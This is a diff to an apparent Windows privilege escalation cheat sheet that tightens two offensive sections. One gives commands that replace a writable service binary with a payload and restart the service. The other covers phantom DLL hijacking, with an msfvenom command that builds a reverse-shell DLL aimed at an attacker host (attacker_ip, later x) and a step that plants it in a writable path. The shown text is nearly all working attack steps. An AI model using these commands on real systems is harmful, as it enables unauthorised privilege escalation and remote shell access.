@@ -158,16 +158,11 @@ Invoke-ServiceAbuse -Name 'VulnService' -UserName 'hacker' -Password 'Password12
 ### Writable Service Binaries
 
 ```powershell
-# Check if the service binary is writable
+# Check if the service binary is writable, then replace it
 icacls "C:\Program Files\Service\binary.exe"
-
-# If writable, replace it
 move "C:\Program Files\Service\binary.exe" "C:\Program Files\Service\binary.exe.bak"
 copy C:\Users\Public\payload.exe "C:\Program Files\Service\binary.exe"
-
-# Restart the service
-sc stop "ServiceName"
-sc start "ServiceName"
+sc stop "ServiceName" && sc start "ServiceName"
 
 # Using PowerUp
 Get-ModifiableServiceFile
@@ -232,18 +227,9 @@ $env:PATH -split ';' | ForEach-Object {
 ### Phantom DLL Hijacking
 
 ```powershell
-# Some services try to load DLLs that do not exist on the system
-# Use procmon to identify these "phantom" DLL loads
-
-# Common phantom DLLs:
-# wlbsctrl.dll   - loaded by IKEEXT service
-# wbemcomn.dll   - loaded by various WMI processes
-# fveapi.dll     - loaded by some services on non-Enterprise editions
-
-# Create malicious DLL
-# msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f dll -o wlbsctrl.dll
-
-# Place in writable PATH directory or application directory
+# Some services load DLLs that do not exist -- use procmon to identify these.
+# Common phantom DLLs: wlbsctrl.dll (IKEEXT), wbemcomn.dll (WMI), fveapi.dll
+# Generate: msfvenom -p windows/x64/shell_reverse_tcp LHOST=x LPORT=4444 -f dll -o wlbsctrl.dll
 copy wlbsctrl.dll C:\writable\path\directory\
 ```
 
